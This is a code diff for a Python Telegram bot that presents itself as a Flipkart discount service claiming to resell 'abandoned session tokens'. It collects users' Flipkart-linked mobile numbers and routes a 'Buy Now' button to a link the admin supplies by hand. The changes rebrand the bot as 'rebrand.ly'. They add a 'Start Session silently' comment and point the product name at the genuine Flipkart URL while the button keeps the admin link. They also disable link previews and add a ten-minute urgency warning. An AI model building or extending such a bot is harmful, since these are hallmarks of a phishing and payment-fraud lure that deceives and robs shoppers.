@@ -35,7 +35,7 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def home():
-    return "X Discount Bot is Running 24/7 Successfully!"
+    return "rebrand.ly Bot is Running 24/7 Successfully!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
@@ -322,9 +322,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data in ["about_us", "hinglish_about"]:
         text = (
-            "How X DISCOUNT Works:\n"
+            "How rebrand.ly Works:\n"
             "When major e-commerce platforms like Flipkart host flagship sales events, high traffic volumes frequently lead to server timeouts and session drops. Consequently, thousands of valid price drops, flash discounts, and promotional tokens are abandoned or fail at checkout.\n\n"
-            "X DISCOUNT serves as a dedicated fallback repository for these unhandled session tokens:\n"
+            "rebrand.ly serves as a dedicated fallback repository for these unhandled session tokens:\n"
             "• Real-Time Token Capture: Our system logs expired or dropped discount session tokens generated during high-load sale events.\n"
             "• Automated Liquidation: We aggregate and validate these tokens so members can access heavy discounts even after flash sales end.\n"
             "• Multi-Sale Integration: Fully synced across major shopping festivals:\n"
@@ -332,9 +332,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         if data == "hinglish_about":
             text = (
-                "X DISCOUNT Kaise Kaam Karta Hai:\n"
+                "rebrand.ly Kaise Kaam Karta Hai:\n"
                 "Jab Flipkart bade sales event host karta hai, tab high traffic ki wajah se server timeout aur session drop ho jate hain. Jisse valid price drops aur tokens fail ho jate hain.\n\n"
-                "X DISCOUNT in unhandled session tokens ke liye ek fallback repository hai:\n"
+                "rebrand.ly in unhandled session tokens ke liye ek fallback repository hai:\n"
                 "• Real-Time Capture: Humara system sale ke dauran expire hue tokens ko log karta hai.\n"
                 "• Sale khatam hone ke baad bhi aap in verified tokens se heavy discount pa sakte hain.\n"
                 "• Supported Sales: Big Billion Days, GOAT Sale, Big Diwali Sale, Flipkart Black Friday Sale."
@@ -349,16 +349,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data in ["terms", "hinglish_terms"]:
         text = (
             "Terms - User Responsibility, Automation, and Refund Policy\n\n"
-            "Users must provide the correct and active mobile number linked to their Flipkart account. The X Discount bot utilizes this mobile number and the provided product link to generate a secure session token specifically for the checkout process, directly opening a checkout page with the discount automatically applied.\n\n"
-            "Please be advised that the transaction will be processed and the order will be placed directly on the Flipkart account associated with the mobile number you provide. X Discount is not responsible, and no refunds or cancellations will be issued, for any financial losses or incorrect orders resulting from the submission of an inaccurate, incorrect, or unauthorized mobile number by the user.\n\n"
-            "However, if a payment fails despite the user providing a valid and correct mobile number, X Discount guarantees a full refund for the transaction amount."
+            "Users must provide the correct and active mobile number linked to their Flipkart account. The rebrand.ly bot utilizes this mobile number and the provided product link to generate a secure session token specifically for the checkout process, directly opening a checkout page with the discount automatically applied.\n\n"
+            "Please be advised that the transaction will be processed and the order will be placed directly on the Flipkart account associated with the mobile number you provide. rebrand.ly is not responsible, and no refunds or cancellations will be issued, for any financial losses or incorrect orders resulting from the submission of an inaccurate, incorrect, or unauthorized mobile number by the user.\n\n"
+            "However, if a payment fails despite the user providing a valid and correct mobile number, rebrand.ly guarantees a full refund for the transaction amount."
         )
         if data == "hinglish_terms":
             text = (
                 "Terms - Upyogkarta ki Zimmedari aur Refund Policy\n\n"
-                "Users ko apna sahi aur active Flipkart registered mobile number dena anivarya hai. X Discount is number aur link ka istemal karke ek secure token banata hai jo automatically discount apply karke checkout page kholta hai.\n\n"
-                "Kripya dhyan dein ki order seedha aapke diye gaye number se linked account pe place hoga. Galat ya unauthorized number dene ki stithi mein kisi bhi nuksan ke liye X Discount zimmedar nahi hoga aur koi refund/cancellation nahi hoga.\n\n"
-                "Lekin, agar valid mobile number hone ke bawajood payment fail hoti hai, toh X Discount pure transaction amount ki refund ki guarantee deta hai."
+                "Users ko apna sahi aur active Flipkart registered mobile number dena anivarya hai. rebrand.ly is number aur link ka istemal karke ek secure token banata hai jo automatically discount apply karke checkout page kholta hai.\n\n"
+                "Kripya dhyan dein ki order seedha aapke diye gaye number se linked account pe place hoga. Galat ya unauthorized number dene ki stithi mein kisi bhi nuksan ke liye rebrand.ly zimmedar nahi hoga aur koi refund/cancellation nahi hoga.\n\n"
+                "Lekin, agar valid mobile number hone ke bawajood payment fail hoti hai, toh rebrand.ly pure transaction amount ki refund ki guarantee deta hai."
             )
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("Hinglish" if data=="terms" else "English", callback_data="hinglish_terms" if data=="terms" else "terms"), InlineKeyboardButton("Back", callback_data="main_menu")],
@@ -492,7 +492,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         try: await query.message.delete()
         except: pass
-        await context.bot.send_message(chat_id=chat_id, text="Turn on bot notification. We will send you the best discount within a few minutes.\nThank you for using X DISCOUNT.")
+        await context.bot.send_message(chat_id=chat_id, text="Turn on bot notification. We will send you the best discount within a few minutes.\nThank you for using rebrand.ly.")
 
         full_name = f"{user.first_name} {user.last_name or ''}".strip()
         admin_message = (
@@ -508,7 +508,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "sp_offer_grab":
         try: await query.message.delete()
         except: pass
-        await context.bot.send_message(chat_id=chat_id, text="Turn on bot notification. We will send you the Discount Redirect.\nThank you for using X DISCOUNT.")
+        await context.bot.send_message(chat_id=chat_id, text="Turn on bot notification. We will send you the Discount Redirect.\nThank you for using rebrand.ly.")
         full_name = f"{user.first_name} {user.last_name or ''}".strip()
         admin_message = f"🎁 <b>[Special Offer]</b>\n1. <b><code>{user.id}</code></b>\n2. {full_name}"
         keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Accept", callback_data=f"adm_accept_{user.id}"), InlineKeyboardButton("Reject", callback_data=f"adm_sp_reject_{user.id}")]])
@@ -527,6 +527,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data.startswith("adm_accept_"):
         target_id = int(data.split("adm_accept_")[1])
+        # Start Session silently.
         admin_sessions[ADMIN_ID] = {"target_user_id": target_id, "step": "WAITING_HYPER_LINK", "data": {}}
         await query.message.edit_text(f"✅ Accepted User {target_id}.\nPlease send the Hyper Link:")
 
@@ -549,15 +550,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_message(chat_id=chat_id, text="❌ Data fetch error. Please contact support.")
             return
 
-        text = (f"🎉 You got <b>{d_data.get('discount')}</b> on <b>{d_data.get('product_name')}</b>.\n"
-                f"You can purchase this product for <b>{d_data.get('final_price')}</b>.")
+        # Formatting Product Name as a Hyperlink pointing to the user's original link
+        orig_link = d_data.get('orig_link', 'https://flipkart.com')
+        if not orig_link.startswith(('http://', 'https://')):
+            orig_link = 'https://' + orig_link
+            
+        product_html = f"<a href='{orig_link}'>{d_data.get('product_name')}</a>"
+
+        text = (f"🎉 You got <b>{d_data.get('discount')}</b> on <b>{product_html}</b>.\n"
+                f"You can purchase this product for <b>{d_data.get('final_price')}</b>.\n\n"
+                f"⚠️ <b>This link is valid for 10 Minutes only.</b>")
         
         url = d_data.get('hyper_link', 'https://flipkart.com')
         if not url.startswith(('http://', 'https://')):
             url = 'https://' + url
             
         kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔴 Buy Now 🔴", url=url)]])
-        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=kb)
+        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
         
         if user.id in context.bot_data.get("user_flow_states", {}):
             context.bot_data["user_flow_states"][user.id] = "DONE"
@@ -752,12 +761,17 @@ async def media_and_text_handler(update: Update, context: ContextTypes.DEFAULT_T
                 data = session["data"]
                 final_price_fmt = format_inr(text)
                 
+                # Fetch user's original product link securely
+                target_user_data = context.application.user_data.get(target_id, {})
+                user_orig_link = target_user_data.get("product_link", "https://flipkart.com")
+                
                 # Safely store robust memory cross-users
                 context.bot_data.setdefault("ready_links", {})[target_id] = {
                     "hyper_link": data["hyper_link"],
                     "discount": data["discount"],
                     "product_name": data["product_name"],
-                    "final_price": final_price_fmt
+                    "final_price": final_price_fmt,
+                    "orig_link": user_orig_link
                 }
                 context.bot_data.setdefault("user_flow_states", {})[target_id] = "READY"
                 
